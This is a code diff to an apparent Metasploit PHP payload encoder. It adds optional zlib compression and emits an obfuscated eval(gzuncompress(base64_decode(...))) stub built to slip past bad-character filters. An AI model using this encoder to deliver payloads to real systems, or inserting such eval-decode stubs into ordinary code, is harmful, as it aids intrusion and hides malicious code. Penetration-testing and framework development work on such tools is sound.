@@ -17,6 +17,11 @@ class MetasploitModule < Msf::Encoder
       'Author' => 'egypt',
       'License' => BSD_LICENSE,
       'Arch' => ARCH_PHP)
+    register_options(
+      [
+        OptBool.new('Compress', [ true, 'Compress the payload with zlib', false ]) # Disabled by default as it relies on having php compiled with zlib, which might not be available on come exotic setups.
+      ],
+      self.class)
   end
 
   def encode_block(state, buf)
@@ -26,12 +31,22 @@ class MetasploitModule < Msf::Encoder
       raise BadcharError if state.badchars.include?(c)
     end
 
+    if datastore['Compress']
+      %w[g z u n c o m p r e s s].uniq.each do |c|
+        raise BadcharError if state.badchars.include?(c)
+      end
+    end
+
     # Modern versions of PHP choke on unquoted literal strings.
     quote = "'"
     if state.badchars.include?("'")
       raise BadcharError.new, "The #{self.name} encoder failed to encode the decoder stub without bad characters." if state.badchars.include?('"')
 
       quote = '"'
+    end
+
+    if datastore['Compress']
+      buf = Zlib::Deflate.deflate(buf)
     end
 
     # PHP escapes quotes by default with magic_quotes_gpc, so we use some
@@ -56,10 +71,6 @@ class MetasploitModule < Msf::Encoder
     # raw string, so strip it off.
     b64.gsub!(/[=\n]+/, '')
 
-    # The first character must not be a non-alpha character or PHP chokes.
-    i = 0
-    b64[i] = "chr(#{b64[i]})." while (b64[i].chr =~ %r{[0-9/+]})
-
     # Similarly, when we separate large payloads into chunks to avoid the
     # 998-byte problem mentioned above, we have to make sure that the first
     # character of each chunk is an alpha character.  This simple algorithm
@@ -76,15 +87,15 @@ class MetasploitModule < Msf::Encoder
     # Plus characters ('+') in a uri are converted to spaces, so replace
     # them with something that PHP will turn into a plus.  Slashes cause
     # parse errors on the server side, so do the same for them.
-    b64.gsub!('+', '.chr(43).')
-    b64.gsub!('/', '.chr(47).')
+    b64.gsub!('+', "#{quote}.chr(43).#{quote}")
+    b64.gsub!('/', "#{quote}.chr(47).#{quote}")
 
     state.badchars.each_byte do |byte|
       # Last ditch effort, if any of the normal characters used by base64
       # are badchars, try to replace them with something that will become
       # the appropriate thing on the other side.
       if b64.include?(byte.chr)
-        b64.gsub!(byte.chr, ".chr(#{byte}).")
+        b64.gsub!(byte.chr, "#{quote}.chr(#{byte}).#{quote}")
       end
     end
 
@@ -98,6 +109,10 @@ class MetasploitModule < Msf::Encoder
     # cause a syntax error.  Remove any trailing dots.
     b64.chomp!('.')
 
-    return 'eval(base64_decode(' + quote + b64 + quote + '));'
+    if datastore['Compress']
+      return 'eval(gzuncompress(base64_decode(' + quote + b64 + quote + ')));'
+    else
+      return 'eval(base64_decode(' + quote + b64 + quote + '));'
+    end
   end
 end
